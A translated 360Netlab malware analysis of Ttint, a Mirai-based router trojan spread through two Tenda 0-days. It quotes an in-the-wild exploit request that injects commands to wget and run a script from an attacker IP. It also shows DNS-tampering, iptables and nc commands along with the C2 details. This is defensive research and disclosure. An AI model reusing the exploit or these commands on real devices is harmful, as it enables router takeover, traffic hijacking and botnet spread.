# Ttint: 一款通过2个0-day漏洞传播的IoT远控木马
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：[涂凌鸣](https://twitter.com/IUnKnow84503351)，[马延龙](https://twitter.com/_O_owl)，[叶根深](https://twitter.com/zom3y3)
## 背景介绍
从2019年11月开始，360Netlab未知威胁检测系统Anglerfish蜜罐节点相继监测到某个攻击者使用2个腾达路由器0-day漏洞传播一个基于Mirai代码开发的远程控制木马（RAT）。
常规的Mirai变种基本都是围绕DDoS做文章，而这个变种不同，在DDoS攻击之外，它针对路由器设备实现了Socket5代理，篡改路由器DNS，设置iptables，执行自定义系统命令等多达12个远程控制功能。
此外，在C2通信层面，它使用WSS (WebSocket over TLS)
协议，一方面这样在流量层面可以规避非常成熟的Mirai流量检测，另一方面可以为C2提供安全加密通信。
在C2本身，攻击者最开始使用了一个Google的云服务IP，其后切换到位于香港的一台托管主机，但是当我们使用网站证书，样本，域名及IP在我们的DNSmon系统里深入扩展关联后，我们看到更多的基础设施IP，更多的样本，和更多的C2域名。
两个0 day，网关设备的12种远控功能，加密流量协议，多次更换的基础设施IP，我们怀疑这个也许不是普通玩家。
这个僵尸网络我们将它命名为Ttint。
## 0-day漏洞攻击
2019年11月9号，我们监测到攻击者使用第一个Tenda路由器0-day漏洞（CVE-2020-10987），传播Ttint样本。值得注意的是，这个漏洞直到2020年7月10号才被披露出来[[1]](https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68)。
    GET /goform/setUsbUnload/.js?deviceName=A;cd%20/tmp%3Brm%20get.sh%3Bwget%20http%3A//34.92.139.186%3A5001/bot/get.sh%3Bchmod%20777%20get.sh%3B./get.sh HTTP/1.1
    Host: {target}
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.22.0
2020年8月21号，我们监测到攻击者使用第二个Tenda路由器0-day漏洞，传播Ttint样本。
2020年8月28号，我们通过邮件向路由器厂商Tenda报告了第二个0-day漏洞详情以及在野PoC，尚未得到厂商回复。
## 0-day漏洞影响范围
360 FirmwareTotal系统通过对Tenda路由器固件分析和漏洞验证，发现以下Tenda路由器固件受影响。
    US_AC9V1.0BR_V15.03.05.14_multi_TD01
    US_AC9V1.0BR_V15.03.05.16_multi_TRU01
    US_AC9V1.0BR_V15.03.2.10_multi_TD01
    US_AC9V1.0BR_V15.03.2.13_multi_TD01
    US_AC9V1.0BR_V15.03.2.13_multi_TDE01
    US_AC9V3.0RTL_V15.03.06.42_multi_TD01
    US_AC10UV1.0RTL_V15.03.06.48_multi_TDE01
    US_AC15V1.0BR_V15.03.05.18_multi_TD01
    US_AC15V1.0BR_V15.03.05.19_multi_TD01
    US_AC15V1.0BR_V15.03.1.8_EN_TDEUS
    US_AC15V1.0BR_V15.03.1.10_EN_TDC+TDEUS
    US_AC15V1.0BR_V15.03.1.10_EN_TDCTDEUS
    US_AC15V1.0BR_V15.03.1.12_multi_TD01
    US_AC15V1.0BR_V15.03.1.16_multi_TD01
    US_AC15V1.0BR_V15.03.1.17_multi_TD01
    US_AC18V1.0BR_V15.03.05.05_multi_TD01
    US_AC18V1.0BR_V15.03.3.6_multi_TD01
    US_AC18V1.0BR_V15.03.3.10_multi_TD01
    ac9_kf_V15.03.05.19(6318_)_cn
    ac18_kf_V15.03.05.19(6318_)_cn
360 Quake网络空间测绘系统通过对全网资产测绘，发现Tenda路由器0-day具体分布如下图所示。
## Ttint概览
Ttint是一款基于Mirai代码开发的，针对路由器设备的远程控制木马。它除了复用10个 Mirai DDoS攻击指令以外，还实现了12个控制指令。
我们分析对比了2个时期的Ttint样本，发现它们的C2指令是完全相同的，但它们在所使用的0-day漏洞，XOR Key，C2协议上有一些区别。
## 逆向分析
总体来说，Ttint的主机行为比较简单，运行时，删除自身文件，操纵watchdog，防止设备重启；通过绑定端口实现单一实例；接着把修改进程名以迷惑用户；最后和解密得到的C2建立连接，上报设备信息，等待C2下发指令，执行对应的攻击或自定义功能。
我们可以看出它保留了mirai大量特征，诸如单一实例，随机进程名，敏感配制信息加密，集成大量攻击向量等；同时创新地重写了网络通信部分，采用websocket协议，在流量层面规避非常成熟的Mirai流量检测。Mirai已经是社区非常熟悉的老朋友了，因此本文不再赘述Ttint中类似的功能，下文将Ttint
V2的X86架构版本为例，从自定义的功能出发，剖析其具体实现。
###  Ttint v2 样本分析
MD5:73ffd45ab46415b41831faee138f306e  
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked,
stripped  
Lib:uclib
###  Socket5代理
绑定C2下发的特定端口，开启Socket5代理服务。这可以让攻击者远程访问路由器内网，然后实现内网漫游。  
###  篡改路由器DNS
通过修改resolv.conf文件来篡改路由器DNS,
    echo nameserver "DNS server" > /etc/etc/resolv.conf
这种篡改的结果就是Ttint的作者可以劫持受影响路由设备下用户的任意网络访问，窃取敏感信息。
###  设置iptables
通过设置iptables，实现流量转发，目标地址转化功能，下面的模式是将内网的服务暴露到公网上。
    iptables -t nat -A PREROUTING -d "" -p tcp --dport "" -j DNAT --to-destination ""
    iptables -t nat -A POSTROUTING -d "" -p tcp --dport "" -j SNAT ""
    iptables -A FORWARD -d -j ACCEPT
###  反向shell
通过socket实现反向shell，Ttint的作者可以像使用本地shell一样操作受影响路由设备的shell。
###  自升级
从指定的的Download URL（默认为`uhyg8v.notepod2.com:5001`）下载相应CPU架构的Bot程序，实现自升级。
###  自退出
Ttint通过绑定`57322`端口实现单一实例，因此杀死使用这个端口的进程，就能实现自退出，达成清理现场的目的。
###  隐秘的网络通道
通过nc工具监听C2下发的特定端口实现，其中-d的参数的含义是”Detach from
stdin”,因此我们推测PORT之后存在着重定向的相关指令，可以实现Ttint作者和受影响路由设备之间的数据传输。
    nc -d -l "PORT" "some redirect cmd"
###  上报设备信息
将设备的time，os，cpu，ip，version，mac信息上报给C2，不过在样本中的格式化字串`type=back_infoatk_id=%s&time=&os=`中出现了一个Bug，遗漏了一个”&”字符。
###  执行系统命令
通过popen函数，执行C2下发的自定义系统命令
## C2协议分析
Ttint Bot样本的C2信息按照Mirai形式加密存储在配置信息表中，XOR Key为`0x0EDFCEBDA`
    c2 ciphertxt:
    51 19 55 56 56 45 59 50 49 62 0E 4E 4F 54 45 50 4F 44 12 0E 43 4F 4D 20
    c2 plaintxt:
    q9uvveypiB.notepod2.com
当Bot运行时，解密得到C2地址`ws:q9uvveypiB.notepod2.com:443`，然后通过WebSocket over
TLS协议和C2进行安全通信。
###  WebSocket协议
当Ttint
C2回复Bot的响应码为101时，说明协议握手完成，然后Bot可以使用WebSocket协议进行通信。以下是经过TLS解密后的WebSocket数据包示例。
###  Bot的上线包
按照WebSocket协议，我们可以知道Payload长度为0x81, mask为0xD5F39E67，Payload
Data数据地址为0x08~0x88。
    00000000: 81 FE 00 81 D5 F3 9E 67  A1 8A EE 02 E8 91 FF 04  .......g........
    00000010: BE AC F7 09 B3 9C B8 06  A1 98 C1 0E B1 CE AE 41  ...............A
    00000020: A1 9A F3 02 E8 D5 F1 14  E8 BF F7 09 A0 8B BE 53  ...............S
    00000030: FB C2 AB 49 E5 DE AA 55  F8 94 FB 09 B0 81 F7 04  ...I...U........
    00000040: F3 90 EE 12 E8 9A A8 5F  E3 D5 F7 17 E8 C2 A7 55  ......._.......U
    00000050: FB C2 A8 5F FB C1 AC 55  FB C2 AC 5F F3 85 FB 15  ..._...U..._....
    00000060: A6 9A F1 09 E8 C6 FD 02  E5 91 A9 04 E7 D5 FF 15  ................
    00000070: B2 80 A3 41 B8 92 FD 5A  E5 C3 A4 57 B6 C9 AC 5E  ...A...Z...W...^
    00000080: EF C4 F8 5D E7 C7 A4 5E  E7